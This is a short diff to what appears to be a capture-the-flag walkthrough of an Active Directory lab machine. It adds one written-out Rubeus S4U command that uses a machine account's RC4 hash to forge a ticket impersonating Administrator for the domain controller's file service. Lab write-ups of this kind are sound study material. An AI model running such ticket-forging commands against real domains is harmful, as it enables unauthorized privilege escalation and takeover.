@@ -144,6 +144,10 @@ I use Rubeus to hash the password for the new machine (\Rubeus.exe hash /passwor
 
 ![](../../Img/Pasted%20image%2020250430162721.png)
 
+With thi rubeus command i got the ticket. (./rubeus.exe s4u /user:compu$ /rc4:E71B1ABD104A45393C428D263A82B1F2 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt)
+
+![](../../Img/Pasted%20image%2020250430170015.png)
+
 
 
 
